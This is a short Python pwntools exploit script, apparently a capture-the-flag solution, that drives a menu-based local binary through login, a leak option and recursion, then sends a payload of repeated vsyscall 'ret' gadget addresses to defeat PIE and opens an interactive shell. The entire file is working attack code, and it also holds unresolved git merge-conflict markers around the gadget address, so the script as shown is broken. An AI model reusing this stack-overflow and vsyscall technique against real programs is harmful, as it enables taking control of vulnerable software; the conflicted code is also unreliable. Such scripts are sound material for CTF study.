from pwn import *

#context.log_level = 'debug'

def Login(id_):
	s.recvuntil('4.Exit')
	s.sendline('1')
	s.recvuntil('Give me admin id :')
	s.send(id_)
	
def Exploit(id_,payload):
	s.recvuntil('4.Exit')
	s.sendline('2')
	s.recvuntil('So I have to check one more time if you are admin')
	s.send(id_)
	s.recvuntil('Just go for easy exploit!')
	s.send(payload)

def Leak(x):
        s.recvuntil('4.Exit')
        s.sendline('3')
	s.recvuntil('x+0xcafebabe=0xdeadbeef,find the positive x')
	s.sendline(str(x))

def Recursion():
        s.recvuntil('4.Exit')
        s.sendline('A')

admin_id='*****************************************'

if __name__ == '__main__':
	
	s=process('./exploitable')

	count=0
<<<<<<< HEAD
	ret=0xffffffffff600000 #binary protected PIE tech....But vsyscall is fixed!!
=======
	#binary protected PIE tech....But vsyscall is fixed!!
	#0xffffffffff600009 is vsyscall_ret instruction, 
	#But, have to use 0xffffffffff600009 addr to use ret gadget 
	ret=0xffffffffff600000
>>>>>>> 9fd0cd7f0a0b17d8f473d6d947909f8d42bd3d74
	one_offset=0x3802d6

	raw_input('start')
	Login(admin_id) 

	Leak(-3670742)
	Recursion()

	payload=p64(ret)*35

	Exploit(admin_id+'\x00'*(0x30-len(admin_id)),payload)
		
	s.interactive()	
